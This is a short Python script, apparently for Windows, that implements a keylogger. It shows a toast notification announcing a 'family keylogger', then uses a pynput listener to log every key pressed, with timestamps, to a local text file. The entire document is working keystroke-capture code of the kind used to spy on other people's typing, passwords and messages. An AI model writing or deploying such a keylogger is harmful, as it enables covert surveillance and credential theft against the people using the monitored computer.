from pynput.keyboard import Key, Listener
from win10toast import ToastNotifier
import logging

n = ToastNotifier()
n.show_toast("KEYLOGGER", "A family keylogger has started to work", duration=10,
             icon_path="key_icon.ico")

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogger.txt"), \
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
